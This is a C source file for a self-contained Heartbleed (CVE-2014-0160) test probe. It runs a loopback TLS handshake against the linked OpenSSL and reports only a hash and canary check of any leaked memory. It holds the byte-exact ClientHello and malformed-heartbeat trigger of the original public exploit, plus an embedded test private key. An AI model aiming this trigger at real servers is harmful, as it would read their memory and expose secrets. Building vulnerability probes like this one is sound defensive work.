/*
 * hb.c — the Heartbleed (CVE-2014-0160) probe.
 *
 * Performs a REAL TLS handshake against the linked libssl and, at the exact
 * historical moment — immediately after the server's ServerHelloDone, before
 * the client's ChangeCipherSpec — sends the malformed heartbeat message that
 * triggered CVE-2014-0160 (1-byte payload with a 0x4000-byte claimed
 * length). This is the message sequence of the original public exploit
 * (Jared Stafford's ssltest.py), executed verbatim against the linked
 * library's own protocol code:
 *
 *   ClientHello (with the heartbeat extension + renegotiation SCSV)
 *     → ServerHello + Certificate + ServerHelloDone
 *     → malformed heartbeat (plaintext; the read cipher is not yet active)
 *     → a vulnerable library echoes up to 16 KiB of process memory as a
 *       heartbeat response; a fixed library sends a fatal alert and closes.
 *
 * The observable is the exit class and the diagnostic line:
 *   exit 0  stdout "hb: no leak ..."        — the linked library is fixed
 *   exit 1  stdout projection + stderr "HEARTBLEED: leak ..." — vulnerable
 *   exit 2  stderr "hb: indeterminate ..."  — the probe itself failed; never
 *                                              counted as a pass
 *
 * RAW-MEMORY PUBLICATION BOUNDARY: on the leak path the probe NEVER writes
 * the echoed process memory to any observed stream. The vulnerable library
 * answers the malformed heartbeat by echoing up to 16 KiB of process
 * memory; the probe hashes that exact echoed window (SHA-256), scans it
 * for the deterministic synthetic canary it planted in its own heap, and
 * prints ONE projection line to stdout:
 *
 *     hb-leak-projection len=N sha256=<hex> canary=<present|absent> fraction=F
 *
 * so the published evidence records "N bytes were returned, SHA-256 X, the
 * planted synthetic canary was [not] observed" — never arbitrary process
 * memory. The raw bytes exist transiently in the probe's memory for the
 * hash/scan and are discarded; they never reach a capture.
 *
 * The claimed payload length is read from the fixture marker: "malformed
 * 0x4000" claims 0x4000 bytes (the historical exploit value, and the
 * default), "malformed 1" claims 1 byte — so a minimizer can reduce the
 * claim and the court observes the exact trigger threshold. Any claimed
 * length with zero data bytes is a malformed heartbeat (RFC 6520 §4: a peer
 * MUST NOT respond), so a heartbeat RESPONSE of any size is the leak — the
 * classifier is semantic, not a byte-count heuristic.
 *
 * This probe executes only its own sockets; it never reads a file, so the
 * court's fixture is a marker file the probe does not need (the argv slot
 * keeps the court's declared-arguments contract uniform).
 *
 * LOAD ROBUSTNESS: the handshake is a fork/accept/connect race over a
 * loopback socket with a client-side receive timeout. On a co-tenanted CI
 * runner a single side's server flight can be stalled long enough that a
 * tight timeout fires on ONE side and not the other — fabricating a
 * divergence where the two builds are actually identical (exactly what
 * broke the heartbleed clean control on GitHub Actions). The probe
 * therefore retries the whole flow silently (bounded attempts, each with a
 * generous receive timeout that still fits the harness's own wall-clock
 * bound), and ignores SIGPIPE so a write-race with a reaped server child
 * cannot kill the probe with a signal exit. Retries print NOTHING to the
 * observed streams: the exit/stderr/stdout surface is the same whether the
 * flow completed on attempt 1 or attempt 3. A library that genuinely
 * cannot complete a handshake still fails every attempt and exits 2
 * ("indeterminate"), which is never counted as a pass.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/sha.h>

/* A self-signed certificate for the loopback server role (generated once;
 * embedded so the probe is fully self-contained and deterministic). */
static const char PEM_CERT[] =
    "-----BEGIN CERTIFICATE-----\n"
    "MIIDAzCCAeugAwIBAgIUL4kpdxp0vrf8/iQxXqVcE4hHRfwwDQYJKoZIhvcNAQEL\n"
    "BQAwETEPMA0GA1UEAwwGZnJmLWhiMB4XDTI2MDgyMjAwMjcxOVoXDTM2MDgxOTAw\n"
    "MjcxOVowETEPMA0GA1UEAwwGZnJmLWhiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A\n"
    "MIIBCgKCAQEAwEehy0QJhgcmTxRaHp6ZA8e+i0z/HHNoASgZmZvWyEvbE6O32B1+\n"
    "z5yVR9kFlZriNhLFC/F+TQL1teBvyELuFO4FeOXlEnOCTCkbZyJp+0NWHNcDBmLZ\n"
    "CRYbelpcziPsNB18Jqne9KqWtP2+mM9DaXde8u6EbKOzUdyCfQrIujGxoAri4ZJ6\n"
    "UzqV+naD5x+5SK9gzqvh25c/s55QOzgaC61E7JvO6dxJz98yJX9fI1EG+/Wx5EBh\n"
    "28g3+KEGcXgDSnelbswBkkzYHacFUwuhJ30xq+S5taD4B69p16awEH8ZfGaC9EGr\n"
    "5AFPNTV3ZkrTlT6YjrXAg6pDlMc4ZYbFAwIDAQABo1MwUTAdBgNVHQ4EFgQUAXNW\n"
    "gcRK3J2aOwmnNaUFP8zGESMwHwYDVR0jBBgwFoAUAXNWgcRK3J2aOwmnNaUFP8zG\n"
    "ESMwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAtxDuU9xhbV79\n"
    "9UShz6vMGsyTPwzSgzEAPWieFa5oIGAzuSUzLbgDIuXKAj3vqDbGmfEhUHBOHu+E\n"
    "tUFACZMYpYrc0ZSsq2aThTFZxKKZPeNtKdksD3M3GnnFvQqKOlYz6b0uUv5WVlmf\n"
    "a4tmzM2YUskt1XzptWjp4M7KAsQQXNJ/vp1Vj+uA5znP19T9NF4HZUwM4Gs4EERY\n"
    "KahCgGZokRWkP2XBjUxRVl9CM7GUpcW0fE7Cf3m8D+6fx5r4ZYFvBdwW/djwZF4I\n"
    "legZSqxQOWXSEMsKkcCj00ScLHBZsKVFyMQlYB5vEpes+FdLga5DjC+qSebfdiIU\n"
    "ohoQ0isCRA==\n"
    "-----END CERTIFICATE-----\n";

static const char PEM_KEY[] =
    "-----BEGIN PRIVATE KEY-----\n"
    "MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDAR6HLRAmGByZP\n"
    "FFoenpkDx76LTP8cc2gBKBmZm9bIS9sTo7fYHX7PnJVH2QWVmuI2EsUL8X5NAvW1\n"
    "4G/IQu4U7gV45eUSc4JMKRtnImn7Q1Yc1wMGYtkJFht6WlzOI+w0HXwmqd70qpa0\n"
    "/b6Yz0Npd17y7oRso7NR3IJ9Csi6MbGgCuLhknpTOpX6doPnH7lIr2DOq+Hblz+z\n"
    "nlA7OBoLrUTsm87p3EnP3zIlf18jUQb79bHkQGHbyDf4oQZxeANKd6VuzAGSTNgd\n"
    "pwVTC6EnfTGr5Lm1oPgHr2nXprAQfxl8ZoL0QavkAU81NXdmStOVPpiOtcCDqkOU\n"
    "xzhlhsUDAgMBAAECggEABopJNWXujFRbmA6r/rpL9Rt1s+eeDnnZx0mgY/UE32eT\n"
    "yj1kMvcp3uZHaPFiUGjmGeBrOxFEnQT6lkGjO7oUaWTWjdAFXyp2UPXdpz/olUcr\n"
    "O4GQFPGxdS7UfMXBvgdDG7CxuN+dTvrVySPlDZiQhUVYrEWy/mkBCp9IAaMnbwx+\n"
    "Phf10p488HLs0rzEqnbMjdkBTGOiU+FYsbwlkPWE1Cp6gb77NreD8ghvTJ2JqFlq\n"
    "ldVs4SlwxuM0FQjsKbeElDtw8HCnc29OXiOTAcdAKchZlvXic67nurdmAOYxtqgP\n"
    "2Wgiw9eNmqF42zcsp2Cv8Mj1D6vl7nLGBolCZxUpfQKBgQDfhvlCVtNo+iJAYc1/\n"
    "aQVsCRkleKmQjgUON1whHIdSJwOFTWQxrdlMz4hkIkNdODG1s6SWJldLXbonAK2f\n"
    "k6J3NoW2v9P1SLsibwGNFsA5ObmPqvZepuin/dywyAaNvdbu2usaDxPvwI0FuMrA\n"
    "durXHhzLL5A4OduM6RKinZbaxQKBgQDcNo9KxAuLnPtTKn95ri/Z/Qx7cteIlAZ2\n"
    "HNzqwhSfC8T7+8LrzSAZ2/K9bnUSQgxvBEqYaTd5VTsu5UT5ReDrtjt80CDPWpza\n"
    "UqVqJWld+NhH1jt2YcQ6VqzqN5Yv98RNTBlzHl8L1hSz05Pmb11O7Kod/pbKzIfS\n"
    "QSNu1Gi9JwKBgGV4yXjTH5/dRWVCwN4hF+QGcVLwZtGHl0Xv3bPuVoP10ARYsK5Y\n"
    "xHe5EqqaX0hXNUHOLl43Q5OkFdiU1zzE8ZD6wFLI3HjSLpmgGO0qsdKIoPNWYgdv\n"
    "79grR189PrRjxMmjueyXga5qE9rQG8KpeUx0kA+xJOBRa5iZSetmbNAdAoGBAJ8J\n"
    "AB88yiG/83myfXGBLKm/qJ4W6DWIwcnXOmyIUaAzPcXFopXtBDvorrvD4+SVsqkS\n"
    "blT318pWlXFevptPrgpNB1Uych+ODy1U9oVcE2Z8aqYmv7bVEIQZSLO2BU8LHse8\n"
    "J70NuBKyPy1Hpc6LqtVu8cTLslcvsv9Tb6WA3UuNAoGAQZPMI6rYCYkxw4a17C54\n"
    "qhml3cqmwc5PmcRZoxAXV0h04Ct5P+q9Er2FbsW6OmMl3uguTcRQl/egtQ483/Pz\n"
    "kgQT+SScn1z37UQDwQ4FNjk+SAq1B/mTQd9R6rQx4VrupsO9YKM8Ny6eYTKbZGf5\n"
    "NN0DWA7//IMsbqYygH3Gm44=\n"
    "-----END PRIVATE KEY-----\n";

/* THE SYNTHETIC CANARY — deterministic and deliberately synthetic, published
 * in the probe source (it is NOT secret). The probe plants a live arena of
 * these bytes in its heap before the handshake and pre-fills the heap size
 * class OpenSSL's record-read buffer will allocate, so when the vulnerable
 * library over-reads past the malformed heartbeat the echoed window is
 * canary bytes, not uninitialized process memory. The leak projection
 * reports the window's SHA-256 and whether the full seed appeared in it. */
static const unsigned char CANARY_SEED[64] = {
    'F', 'R', 'F', '-', 'S', 'Y', 'N', 'T', 'H', 'E', 'T', 'I', 'C', '-',
    'C', 'A', 'N', 'A', 'R', 'Y', '-', 'V', '1', ':',
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
    0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
    0x5a, 0x5b, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61,
    0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69,
    0xca, 0xfe, 0xba, 0xbe, 0xde, 0xad, 0xbe, 0xef,
};

/* The ClientHello from the original public Heartbleed exploit (Jared
 * Stafford, CVE-2014-0160): TLS 1.1, the 2014-era CBC cipher list, an empty
 * session id, the renegotiation SCSV, and the HEARTBEAT extension
 * (00 0f 00 01 01). Deterministic and historically exact. */
static const unsigned char CLIENT_HELLO[] = {
    0x16, 0x03, 0x02, 0x00, 0xdc, 0x01, 0x00, 0x00, 0xd8, 0x03, 0x02, 0x53,
    0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b, 0xbc, 0x0c, 0xbc, 0x2b, 0x92,
    0xa8, 0x48, 0x97, 0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85, 0x03,
    0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde, 0x00, 0x00, 0x66, 0xc0, 0x14,
    0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21, 0x00, 0x39, 0x00, 0x38, 0x00, 0x88,
    0x00, 0x87, 0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84, 0xc0, 0x12,
    0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b, 0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d,
    0xc0, 0x03, 0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f, 0xc0, 0x1e,
    0x00, 0x33, 0x00, 0x32, 0x00, 0x9a, 0x00, 0x99, 0x00, 0x45, 0x00, 0x44,
    0xc0, 0x0e, 0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41, 0xc0, 0x11,
    0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02, 0x00, 0x05, 0x00, 0x04, 0x00, 0x15,
    0x00, 0x12, 0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08, 0x00, 0x06,
    0x00, 0x03, 0x00, 0xff, 0x01, 0x00, 0x00, 0x49, 0x00, 0x0b, 0x00, 0x04,
    0x03, 0x00, 0x01, 0x02, 0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
    0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c, 0x00, 0x18, 0x00, 0x09,
    0x00, 0x0a, 0x00, 0x16, 0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
    0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05, 0x00, 0x12, 0x00, 0x13,
    0x00, 0x01, 0x00, 0x02, 0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
    0x00, 0x23, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x01, 0x01,
};

/* The malformed heartbeat from the original exploit: record type 0x18
 * (heartbeat), TLS 1.1, 3-byte payload: request type, the claimed payload
 * length, and ZERO real payload bytes (the length is read from the fixture
 * marker, defaulting to the historical 0x4000). */
static unsigned char hb_msg[8];
static size_t hb_msg_len = 8;

static void build_heartbeat(unsigned int claimed) {
    hb_msg[0] = 0x18;                       /* record type: heartbeat */
    hb_msg[1] = 0x03;                       /* TLS 1.1 */
    hb_msg[2] = 0x02;
    hb_msg[3] = 0x00;                       /* 3-byte payload */
    hb_msg[4] = 0x03;
    hb_msg[5] = 0x01;                       /* heartbeat_request */
    hb_msg[6] = (unsigned char)((claimed >> 8) & 0xff);
    hb_msg[7] = (unsigned char)(claimed & 0xff);
    hb_msg_len = 8;
}

/* Read exactly one TLS record; returns the type, or -1 on EOF/error. */
static int read_record(int fd, unsigned char *payload, size_t cap,
                       size_t *plen) {
    unsigned char hdr[5];
    size_t got = 0;
    while (got < sizeof hdr) {
        ssize_t n = read(fd, hdr + got, sizeof hdr - got);
        if (n <= 0)
            return -1;
        got += (size_t)n;
    }
    unsigned int len = ((unsigned int)hdr[3] << 8) | hdr[4];
    if (len > cap)
        return -1;
    got = 0;
    while (got < len) {
        ssize_t n = read(fd, payload + got, len - got);
        if (n <= 0)
            return -1;
        got += (size_t)n;
    }
    *plen = len;
    return hdr[0];
}

static void die(const char *what) {
    fprintf(stderr, "hb: indeterminate (%s)\n", what);
    exit(2);
}

/* The client-side receive timeout, per attempt. Generous enough that a
 * co-tenanted CI runner cannot stall a side past it, yet bounded so the
 * worst case (3 attempts x this) fits comfortably inside the harness's own
 * wall-clock execution bound. A stalled socket read burns no CPU, so the
 * harness's CPU-time limit is not a factor. */
#define RCVTIMEO_SEC 15
#define MAX_ATTEMPTS 3

/* A live canary arena: kept allocated for the probe's whole life so the
 * process heap is dense with synthetic bytes; the server child inherits it
 * via fork. */
static unsigned char *canary_arena;
static size_t canary_arena_len;

static void plant_canary_arena(void) {
    canary_arena_len = 1u << 20; /* 1 MiB of canary */
    canary_arena = malloc(canary_arena_len);
    if (!canary_arena) {
        canary_arena_len = 0;
        return;
    }
    volatile unsigned char *vp = canary_arena;
    for (size_t i = 0; i < canary_arena_len; i++)
        vp[i] = CANARY_SEED[i % sizeof CANARY_SEED];
}

/* Fill + free a canary region in the server child just before the handshake
 * reads: OpenSSL's accept path allocates init_buf (16 KiB), the record-read
 * buffer (18 KiB), the write buffer (18 KiB) — a freed canary chunk of the
 * SAME heap arena is split by those mallocs in turn, so the record-read
 * buffer (whose tail is the heartbeat over-read window) is carved from
 * canary bytes, not uninitialized heap. Sized to cover all three while
 * staying BELOW glibc's mmap threshold (128 KiB): an mmap'd scratch is
 * returned to the OS on free and the handshake allocations get fresh zero
 * pages instead. Must run in the server child after the socket is bound and
 * before the first SSL_read. */
static void plant_read_buffer_canary(void) {
    size_t sz = 96 * 1024; /* covers init_buf + rbuf + wbuf, heap-resident */
    unsigned char *p = malloc(sz);
    if (!p)
        return;
    volatile unsigned char *vp = p;
    for (size_t i = 0; i < sz; i++)
        vp[i] = CANARY_SEED[i % sizeof CANARY_SEED];
    free(p);
}

/* Did the full 64-byte seed appear contiguously in the echoed window? */
static int canary_seed_in_window(const unsigned char *data, size_t n) {
    if (n < sizeof CANARY_SEED)
        return 0;
    for (size_t i = 0; i + sizeof CANARY_SEED <= n; i++)
        if (memcmp(data + i, CANARY_SEED, sizeof CANARY_SEED) == 0)
            return 1;
    return 0;
}

/* The fraction of the echoed window that is canary-consistent under its
 * BEST 64-byte phase alignment (the over-read starts mid-cycle, so the
 * phase must be searched): 1.0 means the window was entirely synthetic. */
static double canary_fraction(const unsigned char *data, size_t n) {
    size_t best = 0;
    for (size_t phase = 0; phase < sizeof CANARY_SEED; phase++) {
        size_t match = 0;
        for (size_t i = 0; i < n; i++)
            if (data[i] == CANARY_SEED[(i + phase) % sizeof CANARY_SEED])
                match++;
        if (match > best)
            best = match;
    }
    return n ? (double)best / (double)n : 0.0;
}

int main(int argc, char **argv) {
    /* The fixture selects the probe mode: "handshake" (the clean control)
     * performs the TLS handshake and sends NO heartbeat at all — both
     * builds must behave identically up to the server flight, proving the
     * observed divergence is specific to the malformed CVE-2014-0160
     * trigger. Any other marker sends the malformed heartbeat; an optional
     * second token is the claimed payload length ("malformed 0x4000",
     * hex or decimal — the historical exploit claimed 0x4000). */
    int clean = 0;
    unsigned int claimed = 0x4000;
    if (argc >= 2) {
        FILE *f = fopen(argv[1], "r");
        if (f) {
            char buf[64] = {0};
            if (fgets(buf, sizeof buf, f)) {
                if (strncmp(buf, "handshake", 9) == 0) {
                    clean = 1;
                } else {
                    char *p = strchr(buf, ' ');
                    if (p) {
                        while (*p == ' ')
                            p++;
                        unsigned long v = strtoul(p, NULL, 0);
                        if (v <= 0xFFFF)
                            claimed = (unsigned int)v;
                    }
                }
            }
            fclose(f);
        }
    }
    build_heartbeat(claimed);
    plant_canary_arena();
    SSL_library_init();
    SSL_load_error_strings();

    SSL_CTX *sctx = SSL_CTX_new(SSLv23_server_method());
    if (!sctx)
        die("cannot create the server TLS context");
    BIO *cbio = BIO_new_mem_buf((void *)PEM_CERT, -1);
    BIO *kbio = BIO_new_mem_buf((void *)PEM_KEY, -1);
    X509 *cert = PEM_read_bio_X509(cbio, NULL, NULL, NULL);
    EVP_PKEY *key = PEM_read_bio_PrivateKey(kbio, NULL, NULL, NULL);
    BIO_free(cbio);
    BIO_free(kbio);
    if (!cert || !key
        || SSL_CTX_use_certificate(sctx, cert) != 1
        || SSL_CTX_use_PrivateKey(sctx, key) != 1)
        die("cannot load the embedded certificate");

    /* Loopback sockets: the server listens, the client connects to itself. */
    int lfd = socket(AF_INET, SOCK_STREAM, 0);
    if (lfd < 0)
        die("socket");
    int one = 1;
    setsockopt(lfd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof addr);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port = 0;
    if (bind(lfd, (struct sockaddr *)&addr, sizeof addr) != 0)
        die("bind");
    socklen_t alen = sizeof addr;
    if (getsockname(lfd, (struct sockaddr *)&addr, &alen) != 0)
        die("getsockname");
    if (listen(lfd, 1) != 0)
        die("listen");

    /* SIGPIPE off: the client writes (ClientHello / heartbeat) race the
     * server child's lifetime; a reaped child must yield EPIPE on the
     * write — a retry — never a signal death that fabricates a divergence
     * on the exit axis with an empty stderr. */
    signal(SIGPIPE, SIG_IGN);

    /* The observed streams are fixed up front; failures of the flow below
     * are retried SILENTLY (nothing may appear on stdout/stderr until the
     * outcome is decided), so the observed surface is identical whether the
     * flow completed on attempt 1 or attempt 3. */
    const char *last_failure = "no server response";
    int status = 0;
    int attempt;
    for (attempt = 1; attempt <= MAX_ATTEMPTS; attempt++) {
        /* ---- SERVER role (the side under test) ---- */
        /* The handshake needs both roles to run CONCURRENTLY (each waits
         * for the other's messages). Fork: the server role runs in the
         * child, the client role in the parent. A FRESH child per attempt:
         * the previous one is reaped before the next connection. */
        pid_t pid = fork();
        if (pid < 0) {
            /* fork failed under load (commit pressure, pid table): a
             * retryable failure like any other flow race — retry the whole
             * flow silently; the verdict is deterministic, so a retry
             * converges. Only an exhausted attempt budget is a failure. */
            last_failure = "fork";
            continue;
        }

        if (pid == 0) {
            int sfd = accept(lfd, NULL, NULL);
            if (sfd < 0)
                _exit(2);
            SSL *sssl = SSL_new(sctx);
            if (!sssl)
                _exit(2);
            SSL_set_accept_state(sssl);
            SSL_set_fd(sssl, sfd);
            /* Plant the read-buffer canary NOW: the record-read buffer
             * (18432 bytes) is not allocated until the first SSL_read
             * (ssl3_setup_buffers); a just-freed canary-filled chunk of the
             * same size class is what that malloc takes, so the
             * heartbeat over-read window past the record is canary bytes
             * rather than uninitialized heap. */
            plant_read_buffer_canary();
            /* SSL_read drives the handshake internally: it reads the
             * ClientHello, writes the ServerHello + Certificate +
             * ServerHelloDone flight, then reads the next record — the
             * malformed heartbeat — which the linked library processes
             * inside ssl3_read_bytes (the vulnerable library echoes the
             * leak here; a fixed library silently discards it). After
             * processing, SSL_read reports WANT_READ (the dispatch asks
             * the application to read again); the child KEEPS WAITING
             * until the client is done, so the socket stays open while
             * the client collects the response. The client kills the
             * child at the end. */
            char sink[1024];
            int rn;
            for (;;) {
                rn = SSL_read(sssl, sink, sizeof sink);
                if (rn > 0)
                    continue;
                int err = SSL_get_error(sssl, rn);
                if (err == SSL_ERROR_WANT_READ)
                    continue;
                break;
            }
            _exit(0);
        }

        /* ---- CLIENT role (the probe) ---- */
        int cfd = socket(AF_INET, SOCK_STREAM, 0);
        if (cfd < 0)
            die("client socket");
        if (connect(cfd, (struct sockaddr *)&addr, sizeof addr) != 0)
            die("connect");
        struct timeval tv;
        tv.tv_sec = RCVTIMEO_SEC;
        tv.tv_usec = 0;
        if (setsockopt(cfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv) != 0)
            die("rcvtimeo");

        if (write(cfd, CLIENT_HELLO, sizeof CLIENT_HELLO)
            != (ssize_t)sizeof CLIENT_HELLO) {
            close(cfd);
            kill(pid, SIGKILL);
            waitpid(pid, &status, 0);
            continue; /* transient: retry silently */
        }

        /* Read the server flight until ServerHelloDone (handshake type
         * 0x0e). */
        unsigned char payload[65536];
        size_t plen = 0;
        int sent_hb = 0;
        int handshake_failed = 0;
        for (;;) {
            int type = read_record(cfd, payload, sizeof payload, &plen);
            if (type < 0) {
                last_failure = "no ServerHelloDone";
                handshake_failed = 1;
                break;
            }
            if (type == 22 && plen >= 1 && payload[0] == 0x0e) {
                if (clean) {
                    /* The clean control ends here: the handshake
                     * completed identically on both builds. Report it and
                     * stop. */
                    fprintf(stdout,
                            "hb: clean control (TLS handshake completed, no heartbeat)\n");
                    fflush(stdout);
                    kill(pid, SIGKILL);
                    waitpid(pid, &status, 0);
                    return 0;
                }
                /* The historical moment: the read cipher is not yet
                 * active, so the plaintext heartbeat is processed as-is. */
                if (write(cfd, hb_msg, hb_msg_len)
                    != (ssize_t)hb_msg_len) {
                    last_failure = "heartbeat write failed";
                    handshake_failed = 1;
                    break;
                }
                sent_hb = 1;
                break;
            }
            if (type == 21) {
                /* The server refused the handshake outright. */
                last_failure = "server alert during handshake";
                handshake_failed = 1;
                break;
            }
        }
        if (handshake_failed) {
            close(cfd);
            kill(pid, SIGKILL);
            waitpid(pid, &status, 0);
            continue; /* transient: retry silently */
        }

        /* Collect the response. A vulnerable server echoes up to 16 KiB of
         * its memory; a fixed server sends a fatal alert and closes. */
        size_t total = 0;
        int got_type = -1;
        for (;;) {
            int type = read_record(cfd, payload + total, sizeof payload - total,
                                   &plen);
            if (type < 0)
                break;
            got_type = type;
            total += plen;
            if (total >= sizeof payload)
                break;
            if (type == 21)
                break; /* alert: the fixed server's answer */
        }

        /* The server child is done. Reap it with a short bound. */
        for (int w = 0; w < 10; w++) {
            if (waitpid(pid, &status, WNOHANG) == pid)
                break;
            usleep(50000);
        }
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
        close(cfd);

        if (!sent_hb) {
            continue; /* cannot happen; retry rather than misclassify */
        }
        if (got_type == 24) {
            /* A heartbeat RESPONSE record to the MALFORMED trigger. RFC
             * 6520 §4 requires a peer to DISCARD a malformed heartbeat;
             * answering it is the vulnerability (CVE-2014-0160). The echoed
             * bytes are process memory. RAW-MEMORY BOUNDARY: the probe
             * never writes them to an observed stream — it computes the
             * projection (response length, SHA-256 commitment of the exact
             * echoed window, whether the planted synthetic canary appeared
             * in it, and the canary-consistent fraction) and prints only
             * that. The raw bytes are discarded after the hash/scan. */
            unsigned char digest[SHA256_DIGEST_LENGTH];
            SHA256(payload, total, digest);
            char hex[65];
            for (int i = 0; i < SHA256_DIGEST_LENGTH; i++)
                snprintf(&hex[i * 2], 3, "%02x", digest[i]);
            int seen = canary_seed_in_window(payload, total);
            double frac = canary_fraction(payload, total);
            fprintf(stdout,
                    "hb-leak-projection len=%zu sha256=%s canary=%s fraction=%.2f\n",
                    total, hex, seen ? "present" : "absent", frac);
            fflush(stdout);
            fprintf(stderr,
                    "HEARTBLEED: the linked libssl echoed %zu bytes in the heartbeat response\n",
                    total);
            return 1;
        }
        if (got_type == 21) {
            /* A fatal alert: the malformed heartbeat was refused. */
            fprintf(stdout, "hb: no leak (alert response)\n");
            return 0;
        }
        if (got_type < 0 && total == 0) {
            /* The handshake succeeded and the heartbeat was sent, yet
             * nothing came back: the fixed behavior is to SILENTLY
             * DISCARD a malformed heartbeat (RFC 6520 §4 — the 1.0.1g fix
             * returns without a response). A vulnerable library always
             * answers. A timeout or EOF after a completed handshake is
             * therefore the fixed outcome, not an indeterminate one. */
            fprintf(stdout,
                    "hb: no leak (malformed heartbeat silently discarded)\n");
            return 0;
        }
        if (got_type < 0 && total > 0) {
            /* A response started but stalled mid-read: transient load.
             * Retry the whole flow; the leak/no-leak verdict is
             * deterministic, so a retry converges. */
            last_failure = "truncated response";
            continue;
        }
        fprintf(stdout,
                "hb: no leak (connection closed without a heartbeat response)\n");
        return 0;
    }

    /* Every attempt stalled: the probe itself failed. Never a pass. */
    die(last_failure);
}
